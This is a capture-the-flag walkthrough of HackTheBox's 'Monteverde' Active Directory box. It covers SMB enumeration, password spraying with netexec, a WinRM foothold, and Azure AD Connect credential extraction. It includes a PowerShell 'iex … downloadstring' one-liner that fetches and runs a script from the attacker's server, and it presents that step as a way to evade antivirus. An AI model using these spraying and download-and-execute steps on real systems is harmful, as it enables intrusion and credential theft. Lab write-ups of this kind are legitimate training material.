---
title: "Monteverde"
date: 2025-06-26
excerpt: A complete walkthrough of HTB’s Monteverde box covering AD enumeration, Azure abuse, and domain compromise.
categories:
  - htb 
tags:
  - active-directory
  - smb
  - ftp
  - winrm
  - netexec 
  - Azure Abuse      
header:
  teaser: /assets/images/htb/monteverde/mv.png
toc: true
---



<img src="/assets/images/htb/monteverde/mv.png"
     alt="Alt text describing the image"
     class="align-center"      
     style="max-width: 600px;" />

# Overview

Monteverde is an Active Directory machine on HackTheBox. This box emphasizes leveraged default or weak passwords to gather user information through SMB enumeration and gain an initial foothold. From there, we can pivot using WinRM and exploit Azure AD Connect to extract credentials from the local database. With these extracted credentials, we can escalate directly to administrator.

---

## Full Port Scan and Initial Enumeration

I initiated a full TCP port scan using aggressive timing to quickly identify open services. 

---

```bash

nmap -sCV -p- <ip or box name> --min-rate=1000 --min-parallelism=1000 -v
```

**Key Flags:**
- `-sC`: runs default Nmap scripts
- `-sV`: enables version detection
- `-p-`: Scans all 65535 ports
- `--min-rate=1000`: sends packets faster than the default rate.
- `--min-parallelism=1000`: sends probes in parallel for speed.

> I only use `--min-rate` and `--min-parallelism` in CTF environments to speed up discovery.

```bash
Nmap scan report for 10.129.228.111
Host is up (0.56s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-26 17:12:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5h06m34s
| smb2-time: 
|   date: 2025-06-26T17:13:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

The Nmap results show that ports 53 (DNS), 88 (Kerberos), 139 and 445 (SMB), and 389 (LDAP) are open, which is a good indicator that this is a Domain Controller.

We also see that the domain name is megabank.local.  

For this box, I will start with the SMB first, as it is generally easier to enumerate. If we can gain access with a Null session, we may be able to find important information or users.  

---

## SMB Enumeration

With SMB, we have numerous tools at our disposal to enumerate. They generally go by quickly, but it's essential to try different things out, as you may receive different information.  

The first thing I like to do with SMB is to enumerate for Null sessions.  

```bash
smbclient -L \\\\<ip>\\ -N
```
**Key Flags:**
- `-L`: This option allows you to list the existing shares.
- `-N`: Allows us to try and connect to SMB without credentials (Null Session) 

We see that the login was successful, but no shares are visible. 

![](/assets/images/htb/monteverde/1.png)

I decided to run enum4linux to see if anything pops up with 0 credentials.

```bash
enum4linux -a <ip>
```
**Key Flags:**
- `-a`: This option will run a full enumeration scan using various flags that enum4linux has.  

![](/assets/images/htb/monteverde/2.png)

If we scroll down to the groups section, we see `Getting domain group memberships`, which shows a list of users on the machine.

![](/assets/images/htb/monteverde/3.png)

Taking that list, I will add all users into a file named `users` and keep that for reference.  

![](/assets/images/htb/monteverde/4.png)

We currently have two possibilities. The first step is to use a password list and check if any accounts use generic passwords. Alternatively, we can recreate the user list as a password list and verify if, by default, they are using their username as their password.

I will try using rockyou.txt as a password file first and see what happens.  

*NOTE:* Using rockyou.txt with netexec may give you an error because it is not in UTF-8. We can change this by running `iconv -f ISO-8859-1 -t UTF-8 rockyou.txt -o rockyou-utf8.txt`.

```bash
netexec smb <ip> -u users -p rockyou-utf8.txt --continue-on-success
```
![](/assets/images/htb/monteverde/6.png)

We weren't able to get any hits with this.  

So, let's try using users as passwords.

I ran `sudo cp users pass` so that we can have a password file filled with users as a secondary measure.

![](/assets/images/htb/monteverde/5.png)

Now that we have this password list, we will rerun netexec with the new `pass` list.

```bash
netexec smb 10.129.228.111 -u users -p pass --continue-on-success 
```
We found a user and their password. We are finally moving a bit forward, but before we do, for those of you who may not know, `--continue-on-success` allows netexec to keep pushing through the list after it has found valid credentials. 
 
 Usually, it would stop at 1 valid credential, but what could happen is that we have multiple ones, and we wouldn't know. 
 
  I generally keep `--continue-on-success` for that reason.

![](/assets/images/htb/monteverde/7.png)

Now that we know the SABatchJobs password, I will create a new list called `validpass` and add every valid password to it, keeping things separated and organized.


---

## SMB With Credentials

There are several ways we can approach this. 

 An Easy way is to use netexec so we get an idea of what shares are available, then use smbclient to connect if we have read permissions on a share.  

Another way is to use smbclient or smbmap to view the available shares and proceed from there. 

 I like using netexec for initial enumeration of shares and then fully connecting with smbclient. However, to change a few things, I am going to run smbmap and then connect with smbclient.

```bash
smbmap -H 10.129.228.111 -u SaBatchJobs -p <password> 
```
![](/assets/images/htb/monteverde/8.png)

**note:** Here is another way to view the same thing we did with smbmap using netexec.  

```bash
nxc smb <ip> -u <user> -p <pass> --shares
```

We have access to 2 shares, `azure_uploads` and `users$`. We are going to review both to see if there is any possible information that may be available to push us forward.  

```bash
smbclient \\\\ip\\azure_uploads -U SaBatchjobs
```

![](/assets/images/htb/monteverde/9.png)

In `azure_upload`, we are left with an empty share folder. Now let's take a look at the `users$`.  

![](/assets/images/htb/monteverde/12.png)

We see 4 folders for `dgalanos`, `mhope`, `roleary`, and `smorgan`. After going through each folder using `cd` in smbclient, we stumbled on an `azure.xml` file in `mhope`s directory.  

We can retrieve that file by running `get azure.xml`. This initiates a transfer from that drive to our system using smbclient.

![](/assets/images/htb/monteverde/10.png)

Opening the file, we see possible credentials for mhope. 

![](/assets/images/htb/monteverde/11.png)

We will now add that to our validpass list and move forward.

---

## FootHold

We will go back to using netexec and see if we can use the two passwords we have received.  

Looking back at our Nmap scan, we see that port 5985 (WinRM) is open. This is most likely the way in.

```bash
nxc winrm 10.129.228.111 -u users -p validpass
```
![](/assets/images/htb/monteverde/13.png)

As we can see, we have valid credentials showing pwned with mhope and the new password that we have found.  

Now let's get in with WinRM.

```bash
evil-winrm -i <ip> -u mhope -p <password>
```

![](/assets/images/htb/monteverde/14.png)

We are in and can now access the MHopes desktop, where we should hopefully find the user.txt file.

![](/assets/images/htb/monteverde/15.png)

## Privilege Escalation

We now have the user.txt flag and can start enumerating to see if we can gain admin privileges and complete this box.  

I will start by running `whoami /priv` to see if there is any token we can use to abuse.  

![](/assets/images/htb/monteverde/16.png)

Unfortunately, there is nothing there.

Let's take a look at MHOPE and what groups they are a part of.

![](/assets/images/htb/monteverde/17.png)

From our enumeration with SMB, we saw `azure_uploads`; now we are seeing' mhope' as `azure admin`.  

If we check `C:\Program Files`, we can also see `Azure AD Sync` and `Azure AD Connect`. This all points to an Azure exploit that is out there.

![](/assets/images/htb/monteverde/18.png)

---

## AD Connect Exploit

Googling Azure AD connect exploit brought me to [xpn azure AD Red Team](https://blog.xpnsec.com/azuread-connect-for-redteam/).  

XPN does a great job explaining how everything works and provides us with a script that we need to modify to get it working.  

The minor change is to add `server=127.0.0.1;Database=adsyncIntegrated Security=True` in the arguments list of the script.

![](/assets/images/htb/monteverde/19.png)

Now what we are going to do is run `iex(new-object net.webclient).downloadstring('http://ip/adsync.ps1')`.  

**What does this command do?**
This is a standard one-liner used for PowerShell scripts. 
- `iex` means Invoke-Expression, which executes the downloaded string as a PowerShell command.
- `new-object net.webclient` creates a web client object to perform web requests.
- `downloadstring` fetches the content generally from a script.

Put this altogether, and we can run scripts directly from memory instead of downloading and importing the module.  

**Why do this?**
If AV is turned on, it won't get popped rather quickly and keeps us from downloading anything onto the system, leaving tools behind, etc.

Now, on our system, we will open a Python server.

```bash
python3 -m http.server 80
```

Once we do that we will run `iex(new-object net.webclient).downloadstring('http://<our ip>/adsync.ps1')`

![](/assets/images/htb/monteverde/20.png)

---


## Post-Exploitation and Flag

We now have administrator credentials and can log in through WinRM as Administrator.

![](/assets/images/htb/monteverde/21.png)

 Lastly, as usual per HTB, we can go to `C:\users\administrator\desktop\`  

 and `cat root.txt`

![](/assets/images/htb/monteverde/22.png)

---

## Key Takeaways
- Services give you a good idea early on as to whether a system is a domain.
- SMB Null Sessions: It's always good to use multiple tools, as one tool may not reveal anything, but others may leak usernames.
- Testing users as passwords is a good move when all else fails.
- WinRM can be a goldmine if you have the necessary credentials, and it is easy to use for post-exploitation purposes.
- PowerShell's iex with downloadstring keeps scripts off disk and helps evade detection.

---


